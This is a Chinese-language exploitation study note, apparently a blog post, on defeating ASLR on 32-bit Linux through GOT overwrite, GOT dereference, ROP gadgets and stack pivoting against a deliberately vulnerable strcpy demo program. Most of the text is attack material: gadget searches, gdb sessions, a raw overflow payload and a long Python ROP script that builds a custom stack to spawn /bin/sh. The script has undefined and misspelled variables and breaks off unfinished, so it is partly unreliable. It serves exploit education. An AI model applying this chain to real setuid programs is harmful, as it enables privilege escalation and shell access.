# 0x00 beginning

这个笔记记录学习 [^origin] 如何利用`GOT overwrite`与`GOT dereference`绕过共享库随机化, 不同于此前的`overwrite plt`, 在这里攻击者可不依赖的`plt`的存在与否.

### what is GOT overwrite?

>本方法, 攻击者可用其他`libc`函数的地址来覆写`libc`中另一函数的`GOT`入口. 例如`GOT`包含`getuid`函数地址 (在第一次调用过后, 动态绑定), 但其值可被覆写为`execve`函数地址, 因在共享库中函数的相对偏移量是常数, 因此若将同一共享库中两个不同函数偏移量的值相加回原`GOT`入口, 本例子中就可获得`execve`函数地址, 而后可期望调用`getuid`时变为`execve`!
>
    offset_diff = execve_addr - getuid_addr
    GOT[getuid] = GOT[getuid] + offset_diff

### What is GOT dereference?

>本方法与`GOT overwrite`相似, 但这代替覆写入`GOT`入口的实际函数的值是复制到寄存器后加上面偏移量到*寄存器*内的值, 因此寄存器存放`libc`中某函数地址. 例如`GOT[getuid]`包含`getuid`函数地址, 把它复制到寄存器内, 后将两个函数的偏移量相加到寄存器里面, 这样 call 寄存器就变成调用另一函数了.
>
    offset_diff= execve - getuid_addr
    eax = GOT[getuid]
    eax = eax + offset_diff
>
>两技术看上去比较相似, 但在缓冲区溢出发生时如何具体表现呢? 需要识别某个函数与转跳的实际函数来完成 GOT 复写或间接引用, 但显然没有单个函数 (既不在`libc`也不在当前执行体内) 提供这样的功能, 这种情况`rop`中被用到.

### what is ROP?

>`ROP`是攻击者获得调用栈控制权的技术. 它可在即使没有简单方式的情况下执行为特定动作设计而精心拼凑出的机器指令. 如`ret-2-libc`攻击中, 用`system()`地址覆写返回地址, 但如果`system()`或类似函数`execve() 族`被从`libc`中剥离了, 那么就不能用这方法获得 shell 了. 这种情况下, 攻击者可通过一系列`gadget`来模拟在`libc`没有提供的函数以此修复`ROP`.

### what is Gadget?

>`Gadgets`是以‘ret‘结束的汇编指令集合. 攻击者用`Gadget`覆盖返回地址, 这些`Gadget`包含类似于`system()`开头的小部分汇编指令. 因此返回到这些`Gadgets`上可执行部分`system()`功能.`system()`剩下的功能通过其他的`gadgets`来完成, 这样, 通过一系列的`gadgets`可以模拟`system()`基本功能.

### How to find available gadgets in an executable?

>可使用`gadget`发现工具在二进制文件中寻找 gadget 指令 (比如 ropme, ROPgadget, rp++[下载](https://github.com/downloads/0vercl0k/rp/rp-lin-x86)). 这些工具大约是先找`ret`然后往前看一条乃至更多条机器指令.

### 演示代码 [^binary]

```c

// gcc -fno-stack-protector
// echo 2 > /proc/sys/kernel/randomize_va_space

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main (int argc, char **argv) {
char buf[256];
int i;
seteuid(getuid());
if(argc < 2) {
puts("Need an argument\n");
exit(-1);
}
strcpy(buf, argv[1]);
printf("%s\nLen:%d\n", buf, (int)strlen(buf));
return 0;
}

```

# 0x10 利用

在这里不需要使用`rop gadget`来模拟任何`libc`功能, 取而代之的是需要覆写`libc`中某函数的`GOT`入口或确认任意寄存器的`libc`函数地址, 以此尝试突破.

## 0x11 got overwrite using rop

### gadget 1

因为要写内存, 第一个找的`gadget`是目的操作数是内存的, 使用`ROPgadget`帮找这样的指令, 不过没有发现, 尝试使用手动的方法.

手工搜索, 首先反汇编目标文件 (个人习惯于 Intel 风格):

```shell
Sn0rt@warzone:~/lab$ objdump -M intel -d aslr_3 > out
```
的确找到了一条:

    236  8048607:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax

这是为数不多两边操作数都是 32 位且目的操作数是内存的指令, 但是这条指令不是`ret`结尾的! 需要利用手工确认的方法查看它是否对数据一致性造成破坏与否.

```shell
gdb-peda$ disassemble __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   ...
   0x08048607 <+71>:	mov    DWORD PTR [esp+0x4],eax
   0x0804860b <+75>:	call   DWORD PTR [ebx+edi*4-0xf8]
   0x08048612 <+82>:	add    edi,0x1
   0x08048615 <+85>:	cmp    edi,esi
   0x08048617 <+87>:	jne    0x80485f8 <__libc_csu_init+56>
   0x08048619 <+89>:	add    esp,0x1c
   0x0804861c <+92>:	pop    ebx
   0x0804861d <+93>:	pop    esi
   0x0804861e <+94>:	pop    edi
   0x0804861f <+95>:	pop    ebp
   0x08048620 <+96>:	ret
```

在`0x080485ff`和`0x08048620`下断点, 命中`0x080485ff`时候确认 [esp+4] 的实际位置和里面值. 而后`continue`到`ret`确认内存原内存位置里面的值.

```shell
gdb-peda$ x/xw $esp+0x4
0xbffff694:	0xbffff754
gdb-peda$ c
gdb-peda$ x/xw 0xbffff694
0xbffff694:	0xbffff754
```

确认完毕, 发现`eax`的值被保存在`0xbffff694`在`ret`调用前没有被修改, 这样可能使`eax`里面的值为`GOT[execve]`的地址, 那么`overwrite GOT`就有希望了, 不过还有个问题就是这个值虽然没有被修改, 但是如何取出呢?

### gadget 2
gadget 1 长成那样, 接下来只能找使`[esp+0x4]`=`0x0804a010`(相当于指针本身的比较), 所以`esp`应该变成`0x0804a006`, 所有需要找形如`pop esp`或`mov esp, reg`值的指令与`pop eax` 或者 `mov eax, reg`, 这样`mov DWORD PTR [esp+0x4],eax`的目的操作数才变成`GOT[getuid]`的入口, 而源操作数`GOT[execve]`是放置在`eax`里面, 构造成这样覆写才有希望.

```shell
Sn0rt@warzone:~/lab$  objdump -R aslr_3

aslr_3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
0804a010 R_386_JUMP_SLOT   getuid
...
```

找啊找.... 即没有形如`pop esp`也没有形如`pop eax`, 所有放弃在可执行文件找 (可能是程序太小了, 可以了复用的不多), 准备去`libc`里面找, 使用时思路是混合`libc`与当前文件的`gadget`.

```shell
Sn0rt@warzone:~/lab$ ROPgadget --binary  /lib/i386-linux-gnu/libc-2.19.so  --ropchain

- Step 1 -- Write-what-where gadgets

[+] Gadget found: 0xa6a2c mov dword ptr [edx], eax ; ret
[+] Gadget found: 0x1aa2 pop edx ; ret
[+] Gadget found: 0x2469f pop eax ; ret
[+] Gadget found: 0x2f06c xor eax, eax ; ret

```
方便太多, 这样 eax 放入`0xb7ed8be0`,`edx`放入`0x0804a010`.

### exp 初步

计划完全使用来自`libc`的`gadget`(其实使用原文件的`gadget`与用来自`libc`复杂度一样).

    Sn0rt@warzone:~/lab$ for ((i = 0; i < 1000; i++ )); do ldd ./aslr_3|grep libc|grep 0xb75..000; done|wc
    837    3348   47709

统计分析开发 libc 以`0xb75`开头大约 80% 多一点, 尝试构造`gadget`来暴力覆盖`overwrite`.
不过这里需要先构造一下`payload`, 利用调试模式下面`glibc`没有随机化的特点来验证一下想法！

```shell
gdb-peda$ r $(python -c 'print "A" * 260 + "\x9f\x76\xe4\xb7" + "\xe0\x8b\xed\xb7"+ "\xa2\x4a\xe2\xb7" + "\x10\xa0\x04\x08" + "\x2c\x9a\xec\xb7"')
Starting program: /home/Sn0rt/lab/aslr_3 $(python -c 'print "A" * 260 + "\x9f\x76\xe4\xb7" + "\xe0\x8b\xed\xb7"+ "\xa2\x4a\xe2\xb7" + "\x10\xa0\x04\x08" + "\x2c\x9a\xec\xb7"')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�v�������J���,�
Len:280

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb7ed8be0 (<__execve>:	push   edi)
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0x0
EDX: 0x804a010 --> 0xb7ed8be0 (<__execve>:	push   edi)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5c4 --> 0xbffff644 --> 0xbffff774 ("/home/Sn0rt/lab/aslr_3")
EIP: 0x0
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x0
[------------------------------------stack-------------------------------------]
0000| 0xbffff5c4 --> 0xbffff644 --> 0xbffff774 ("/home/Sn0rt/lab/aslr_3")
0004| 0xbffff5c8 --> 0xbffff5e4 --> 0x57f42b13
0008| 0xbffff5cc --> 0x804a02c --> 0xb7e3c990 (<__libc_start_main>:	push   ebp)
0012| 0xbffff5d0 --> 0x804827c --> 0x62696c00 ('')
0016| 0xbffff5d4 --> 0xb7fcd000 --> 0x1a9da8
0020| 0xbffff5d8 --> 0x0
0024| 0xbffff5dc --> 0x0
0028| 0xbffff5e0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000 in ?? ()
gdb-peda$ x/1xw 0x804a010
0x804a010 <getuid@got.plt>:	0xb7ed8be0
gdb-peda$ p getuid
$6 = {<text variable, no debug info>} 0xb7ed96a0 <__getuid>
gdb-peda$ p execve
$7 = {<text variable, no debug info>} 0xb7ed8be0 <__execve>
```

可以看见在调试模式下覆盖`GOT[getuid]`成功了！但是应用到实际环境中应该存在一个问题:`gadget`与`__execve`依赖 libc 基地址.
不过到这里打算暂停一下, 去验证作者的另一个思路.

## 0x12 got dereference using rop

`overwrite got`利用执行体里面的`gadget`失败而后利用`libc`完成了想法, 现尝试`got dereference`思路:

    offset_diff = execve_addr - getuid
    reg = GOT[getuid]
    reg = reg + offset_diff
    call reg

### Gadget 1

优先使用原执行体的`gadget`(不用担心 glibc 版本. 不依赖`libc`基址, 因为`text`段不参与随机化).

```shell
Sn0rt@warzone:~/lab$ ROPgadget --binary aslr_3|grep call
0x080484a6 : call eax
0x080484e3 : call edx
```

发现只有两个形如`call reg`, 检查两寄存器的上下关联是否能构造出`reg = reg + offset_diff`表达式.

```shell
Sn0rt@warzone:~/lab$ ROPgadget --binary aslr_3 | egrep "eax|edx"| egrep "sub|add"
0x080484dd : add al, 0x24 ; cmp byte ptr [eax - 0x2d00f7fc], ah ; leave ; ret
0x080484a0 : add al, 0x24 ; cmp byte ptr [eax - 0x2f00f7fc], ah ; leave ; ret
0x080484a4 : add al, 8 ; call eax
0x080484e1 : add al, 8 ; call edx
0x08048488 : add al, 8 ; cmp eax, 6 ; ja 0x8048497 ; ret
0x080485b4 : add byte ptr [eax], al ; add byte ptr [eax], al ; leave ; ret
0x080485b5 : add byte ptr [eax], al ; add cl, cl ; ret
0x08048394 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080485b6 : add byte ptr [eax], al ; leave ; ret
0x08048720 : add cl, byte ptr [eax + 0xe] ; adc al, 0x41 ; ret
0x0804871c : add eax, 0x2300e4e ; dec eax ; push cs ; adc al, 0x41 ; ret
0x08048505 : add eax, 0x804a038 ; add ecx, ecx ; ret
0x080484c2 : add eax, edx ; sar eax, 1 ; jne 0x80484cf ; ret
0x0804852a : and al, 0x10 ; lahf ; add al, 8 ; call eax
0x0804852c : lahf ; add al, 8 ; call eax
0x080484c1 : pop ds ; add eax, edx ; sar eax, 1 ; jne 0x80484d0 ; ret
0x08048392 : push 0 ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080484bf : shr edx, 0x1f ; add eax, edx ; sar eax, 1 ; jne 0x80484d2 ; ret
```

排除单字节与立即数操作数, 发现唯一长的有点像的只有`add eax, edx ; sar eax, 1 ; jne 0x80484cf ; ret`.`sar`虽然会对`eax`修改但是在修改之前构造好数据, 使指令执行完变成我们想要的数据,`jne`取决与`EFLAGS`的`ZF`如果其值为`0`就跳了, 可惜的多数情况下就是`0`. 这样就破坏了`gadget chain`!

### 使用 libc 的思路验证

因为原文件缺少`gedget`而不满足构造`rop chain`, 所以准备利用`libc`的`gadget`完成思路.

```shell
Sn0rt@warzone:~/lab$ ./rp-lin-x86 -f  /lib/i386-linux-gnu/libc-2.19.so -r1 |grep "\[eax\]"
0x0018ce3f: call dword [eax] ;  (1 found)
0x0018ce6e: call dword [eax] ;  (1 found)
0x0018ce6f: call dword [eax] ;  (1 found)
0x0018ce9e: call dword [eax] ;  (1 found)
0x0018ce9f: call dword [eax] ;  (1 found)
Sn0rt@warzone:~/lab$ ./rp-lin-x86 -f  /lib/i386-linux-gnu/libc-2.19.so -r1 |grep "pop eax"
0x0002469f: pop eax ; ret  ;  (1 found)
0x00048b04: pop eax ; ret  ;  (1 found)
0x0018ef64: pop eax ; ret  ;  (1 found)
Sn0rt@warzone:~/lab$ ./rp-lin-x86 -f  /lib/i386-linux-gnu/libc-2.19.so -r1 |grep "add dword \[eax\].*"
0x0009483c: add dword [eax], edx ; ret  ;  (1 found)
0x0009485c: add dword [eax], esi ; ret  ;  (1 found)
0x0009484c: add dword [eax], esp ; ret  ;  (1 found)
Sn0rt@warzone:~/lab$ ./rp-lin-x86 -f  /lib/i386-linux-gnu/libc-2.19.so -r1 |grep "pop esi"
0x0012b971: pop esi ; ret  ;  (1 found)
0x0012b9d9: pop esi ; ret  ;  (1 found)
0x0012ba39: pop esi ; ret  ;  (1 found)
```

选择使用的`gadget`, 如下表:

| 0x0018ce3f: call dword [eax] | 0x0002469f: pop eax ; ret  ; | 0x0009485c: add dword [eax], esi ; ret  ; | 0x0012b971: pop esi ; ret  ;|

`payload`构造大约如下:

| pop eax | got | pop esi | offset | add [eax], esi | call eax |

且我们已经知道`offset-diff`值为`0xfffff540`.

```shell
gdb-peda$ nexti
[----------------------------------registers-----------------------------------]
EAX: 0x804a010 --> 0xb7ed96a0 (<__getuid>:	mov    eax,0xc7)
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0x0
EDX: 0xb7fce898 --> 0x0
ESI: 0xfffff540
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5c0 --> 0xb7fafe3f --> 0x10ff
EIP: 0xb7eb785c (<__memrchr_sse2_bsf+684>:	add    DWORD PTR [eax],esi)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xb7eb785c <__memrchr_sse2_bsf+684>:	add    DWORD PTR [eax],esi
   0xb7eb785e <__memrchr_sse2_bsf+686>:	ret
   0xb7eb785f <__memrchr_sse2_bsf+687>:	nop
   0xb7eb7860 <__memrchr_sse2_bsf+688>:	xor    eax,eax
[------------------------------------stack-------------------------------------]
```

观察上下的`EAX`引用地址.

```shell
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0xb7eb785c in __memrchr_sse2_bsf () at ../sysdeps/i386/i686/multiarch/memrchr-sse2-bsf.S:296
296	../sysdeps/i386/i686/multiarch/memrchr-sse2-bsf.S: No such file or directory.
gdb-peda$ nexti
[----------------------------------registers-----------------------------------]
EAX: 0x804a010 --> 0xb7ed8be0 (<__execve>:	push   edi)
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0x0
EDX: 0xb7fce898 --> 0x0
ESI: 0xfffff540
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5c0 --> 0xb7fafe3f --> 0x10ff
EIP: 0xb7eb785e (<__memrchr_sse2_bsf+686>:	ret)
EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)

```
然后准备`call [eax]`, 不过

```shell
[----------------------------------registers-----------------------------------]
EAX: 0x804a010 --> 0xb7ed8be0 (<__execve>:	push   edi)
EBX: 0xb7fcd000 --> 0x1a9da8
ECX: 0x0
EDX: 0xb7fce898 --> 0x0
ESI: 0xfffff540
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5c4 --> 0xbffff600 --> 0x0
EIP: 0xb7fafe3f --> 0x10ff
EFLAGS: 0x283 (CARRY parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xb7fafe3f:	call   DWORD PTR [eax]
   0xb7fafe41:	add    BYTE PTR [eax],al
```

不过奇怪的是, 不是转跳到`__execve`而是继续执行, 下一条指令妄图写`text`而导致段错误!

# 0x20 Spawning shell

目前阶段`exp`还不完整, 虽然成功覆写`GOT[getuid]`, 但`spawning shell`还未成功, 复制下面`libc`中的函数到栈上面.

>seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3
>
* setuid@PLT - setuid@plt 的地址 (0x80483d0).
* getuid@PLT – getuid@plt 的地址 (0x80483c0), 不过这个地址因`GOT overwrite`变成了调用`execve`.
* seteuid_arg 该被为获取 shell 置为 0.
* execve_arg1 – filename – 串“/bin/sh”的地址.
* execve_arg2 – argv – 包含 [“/bin/sh”的地址, NULL] 数组的地址.
* execve_arg3 – envp – 环境变量 NULL.

如此以 0 继续进行缓冲区溢出了 (0 是`bad character`), 使用`strcpy()`复制`0`为`setuid()`参数, 但在开启栈随机化的情况下很难奏效, 因为尚不清楚`setuid()`参数准确位置, 需要绕过栈的随机化!

### How to bypass stack randomization?

>可用`custom stack`与`stack pivoting `来完成需求!

### what is custom stack?

>`custom stack`是由攻击者控制的栈区域, 它复制`libc`函数的调用链及其函数参数来绕过栈的随机化. 因攻击者选择任何位置无关代码后写入进程的`custom stack`区域而被绕过, 当前进程中其位置是`0x0804a000`到`0x0804b000`.
>
    gdb-peda$ vmmap
    Start      End        Perm	Name
    0x0804a000 0x0804b000 rw-p	/home/Sn0rt/lab/aslr_3
>
>这区域一般是包含.data 与 .bss 段.

现在知道了`custom stack`的位置, 复制函数和其参数调用链进入`custom stack`. 在我们的问题中, 复制下述为了`spawn shell`的`libc`函数及其调用参数进入`custom stack`.

seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3

想复制上述内容进入`custom stack`还需要以一系列`strcpy()`调用来覆写实际栈的返回地址. 例如复制`seteuid@PLT (0x080483d0)`到`custom stack`, 仍需

>
>* 四次的`strcpy()`调用 -`strcpy()`每次调用参数为十六进制的值 (0x08, 0x04, 0x83, 0xd0).
>* `strcpy()`的源地址参数应该变成包含需要的十六进制值的可执行区域的内存地址且需要确认的是值所在的内存区域不会被修改.
>* `strcpy()`的目标地址参数应该位于`custom stack`中.

遵循上文步骤, 构造期望的`custom stack`内容, 一旦`custom stack`设置完成, 需使用`stack pivoting`技术将其由现行栈移至`custom stack`!

关于`stack pivoting`技术引用`MBE`[^mbe] 课程 ppt 里的一个问题:
Typically in modern exploitation you might only get one targeted overwrite rather than a straight stack smash

>* What can you do when you only have one gadget worth of execution?
>* Answer: Stack Pivoting

### what is stack pivoting?

`Stack pivoting`技术需要用到的`gadget`操作数里面需要有`esp`, 多数情况下更关注`leave ret`, 已经知道`leave`大约是:

    mov ebp, esp
    pop ebp

因此`leave`指令执行前, 加载`custom stack`地址到`EBP`-- 让`ESP`指向`EBP`!
当`leave`被执行完, 如此能成功转到`custom stack`, 而后继续执行被加载到`custom stack`目的是`spawn shell`的`libc`函数.

`stack pivoting`时栈的表现 (注意观察 esp,ebp):

```shell
 gdb-peda$
[----------------------------------registers-----------------------------------]
...
EBP: 0x804a010 --> 0xb7ed96a0 (<__getuid>:	mov    eax,0xc7)
ESP: 0xbffff5a8 --> 0xb7e4769f (<__ctype_get_mb_cur_max+31>:	pop    eax)
...
[-------------------------------------code-------------------------------------]
=> 0x80484a8 <deregister_tm_clones+40>:	leave
   0x80484a9 <deregister_tm_clones+41>:	ret
[------------------------------------stack-------------------------------------]
0000| 0xbffff5a8 --> 0xb7e4769f (<__ctype_get_mb_cur_max+31>:	pop    eax)
0004| 0xbffff5ac --> 0xb7ed8be0 (<__execve>:	push   edi)
0008| 0xbffff5b0 --> 0xb7e24aa2 --> 0x38f8c35a
0012| 0xbffff5b4 --> 0x804a010 --> 0xb7ed96a0 (<__getuid>:	mov    eax,0xc7)
0016| 0xbffff5b8 --> 0xb7ec9a2c (<__GI_time+28>:	mov    DWORD PTR [edx],eax)
0020| 0xbffff5bc --> 0x804a000 --> 0x8049f14 --> 0x1
0024| 0xbffff5c0 --> 0x804827c --> 0x62696c00 ('')
0028| 0xbffff5c4 --> 0xb7fcd000 --> 0x1a9da8
[------------------------------------------------------------------------------]
gdb-peda$
[----------------------------------registers-----------------------------------]
...
EBP: 0xb7ed96a0 (<__getuid>:	mov    eax,0xc7)
ESP: 0x804a014 --> 0xb7f06a30 (<__GI_seteuid>:	push   edi)
...
[-------------------------------------code-------------------------------------]
   0x80484a8 <deregister_tm_clones+40>:	leave
=> 0x80484a9 <deregister_tm_clones+41>:	ret
[------------------------------------stack-------------------------------------]
0000| 0x804a014 --> 0xb7f06a30 (<__GI_seteuid>:	push   edi)
0004| 0x804a018 --> 0xb7eae8d0 (<__strcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
0008| 0x804a01c --> 0x80483f6 (<puts@plt+6>:	push   0x20)
0012| 0x804a020 --> 0x8048406 (<__gmon_start__@plt+6>:	push   0x28)
0016| 0x804a024 --> 0x8048416 (<exit@plt+6>:	push   0x30)
0020| 0x804a028 --> 0xb7ea5e70 (<__strlen_sse2_bsf>:	push   esi)
0024| 0x804a02c --> 0xb7e3c990 (<__libc_start_main>:	push   ebp)
0028| 0x804a030 --> 0x0
[------------------------------------------------------------------------------]
```
这样我们就自己构造出一个自己可控的栈!

### 利用 overwrite 技术的 Exploit

在 [2] 里面介绍的方法因代码生成的原因在这里行不通, 但是`sploitfun`后面部分利用思路依然值得学习, 主要原因是这个技术更具有通用性!

#### 梳理需要的数据
按照`what is custom stack`部分所描述的内存布局找出数据用于后面的构造.

```shell
char *newargv[] = {"/bin/sh", NULL};
execve(newargv[0], newargv, NULL);
```

`execve`的参数构造, 首先构造出一个 char 数组.

```python
# setuid_plt 0x080483d0
setuid_oct1 = 0x8048fa8 # "\x08"
setuid_oct2 = 0x8048110 # "\x04"
setuid_oct3 = 0x8048379 # "\x83"
setuid_oct4 = 0x80483cc # "\xd0"

# getuid_plt 0x080483c0
getuid_oct1 = 0x8048fa8 # "\x08"
getuid_oct2 = 0x8048110 # "\x04"
getuid_oct3 = 0x8048379 # "\x83"
getuid_oct4 = 0x80481cb # "\xc0"

# setuid 参数 0x8048417 "0"
setuid_arg_oct1 = 0x8048fa8 # "\x08"
setuid_arg_oct2 = 0x8048110 # "\x04"
setuid_arg_oct3 = 0x8048019 # "\x84"
setuid_arg_oct4 = 0x8048f94 # "\x17"

# execve 第一个参数 0x0804ac60
execve_arg1_oct1 = 0x8048fa8 # "\x08"
execve_arg1_oct2 = 0x8048110 # "\x04"
execve_arg1_oct3 = 0x8048f50 # "\xac"
execve_arg1_oct4 = 0x80486fc # "\x60"

# execve 第二个参数 0x804ac68
execve_arg2_oct1 = 0x8048fa8 # "\x08"
execve_arg2_oct2 = 0x8048110 # "\x04"
execve_arg2_oct3 = 0x8048f50 # "\xac"
execve_arg2_oct2 = 0x8048688 # "\x68"

# execve 第三个参数 (NULL)
execve_null_arg = 0x08049007 # NULL

execve_path_dst = 0x804ac60   # Custom stack location which contains execve_path "/bin/sh"
execve_path_oct1 = 0x08049158 # "/" 
execve_path_oct2 = 0x08049157 # "b" 
execve_path_oct3 = 0x08049320 # "i"
execve_path_oct4 = 0x080492aa # "n" 
execve_path_oct5 = 0x08049158 # "/"
execve_path_oct6 = 0x08049f68 # "s"
execve_path_oct7 = 0x080493b6 # "h"
execve_path_oct8 = 0x08049007 # NULL

execve_argv_dst = 0x0804ac68  # Custom stack location which contains execve_argv [0x804ac60, 0x0]
execve_arg1_oct1 = 0x8048fa8 # "\x08"
execve_arg1_oct2 = 0x8048110 # "\x04"
execve_arg1_oct3 = 0x8048f50 # "\xac"
execve_arg1_oct4 = 0x80486fc # "\x60"

strcpy_plt = 0x080483e0

ppr = 0x0804861e # "pop edi ; pop ebp ; ret"
lr =  0x080484a8 # "leave; ret"
```

#### 使用`strcpy`每字节复制数据构造`custom stack`

```python
from subprocess import call
from pwn import p32

# Below stack frames are for strcpy (to copy setuid@PLT to custom stack)
cust_esp = 0x804a360
cust_base_esp = 0x804a360

payload = ""

cust_esp += 4                 #Increment by 4 to get past Dummy EBP
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_oct4)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_oct3)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_oct2)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_oct1)

# Below stack frames are for strcpy (to copy getuid@PLT to custom stack)
cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(getuid_oct4)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(getuid_oct3)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(getuid_oct2)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(getuid_oct1)

# Below stack frames are for strcpy (to copy setuid arg to custom stack)
cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_arg_oct1)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_arg_oct2)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_arg_oct3)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(setuid_arg_otc4)

# Below stack frames are for strcpy (to copy execve_arg1  to custom stack)
cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg1_oct4)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg1_oct3)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg1_oct2)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg1_oct1)

#Below stack frames are for strcpy (to copy execve_arg2  to custom stack)
cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg2_oct4)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg2_oct3)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg2_oct2)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_arg2_oct1)

# Below stack frames are for strcpy (to copy execve_arg3  to custom stack)
cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_null_arg)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_null_arg)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_null_arg)

cust_esp += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(cust_esp)
payload += p32(execve_null_arg)

# Below stack frame is for strcpy (to copy execve path "/bin/sh" to custom stack)
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct1)

execve_path_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct2)

execve_path_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct3)

execve_path_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct4)

execve_path_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct5)

execve_path_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct6)

execve_path_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct7)

execve_path_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_path_dst)
payload += p32(execve_path_oct8)

# Below stack frame is for strcpy (to copy execve argv[0] (0x804ac60) to custom stack)
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_argv1_oct4)

execve_argv_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_argv1_oct3)

execve_argv_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_argv1_oct2)

execve_argv_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_argv1_oct1)

# Below stack frame is for strcpy (to copy execve argv[1] (0x0) to custom stack)
execve_argv_dst += 1
payload += p32(strcpy_plt)
payload += p32(ppr_addr)
payload += p32(execve_argv_dst)
payload += p32(execve_null_arg)

execve_argv_dst += 1
